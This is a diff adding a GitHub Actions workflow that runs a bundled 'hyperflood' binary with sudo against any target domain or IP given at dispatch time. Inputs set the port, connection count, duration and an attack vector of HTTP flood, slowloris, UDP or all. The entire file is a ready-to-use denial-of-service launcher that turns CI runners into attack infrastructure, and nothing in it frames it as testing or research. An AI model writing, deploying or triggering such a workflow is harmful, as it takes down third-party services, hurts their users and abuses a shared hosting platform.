@@ -1,0 +1,48 @@
+name: hyperflood-runner
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target domain or IP'
+        required: true
+        default: '127.0.0.1'
+      port:
+        description: 'Target port'
+        required: false
+        default: '80'
+      connections:
+        description: 'Number of connections'
+        required: false
+        default: '2000'
+      duration:
+        description: 'Duration in seconds'
+        required: false
+        default: '300'
+      vector:
+        description: 'Attack vector (http, slowloris, udp, all)'
+        required: false
+        default: 'http'
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Make binary executable
+        run: |
+          chmod +x ./hyperflood
+          ls -la ./hyperflood
+
+      - name: Run hyperflood
+        run: |
+          sudo ./hyperflood \
+            -t ${{ github.event.inputs.target }} \
+            -p ${{ github.event.inputs.port }} \
+            -c ${{ github.event.inputs.connections }} \
+            -d ${{ github.event.inputs.duration }} \
+            -v ${{ github.event.inputs.vector }}
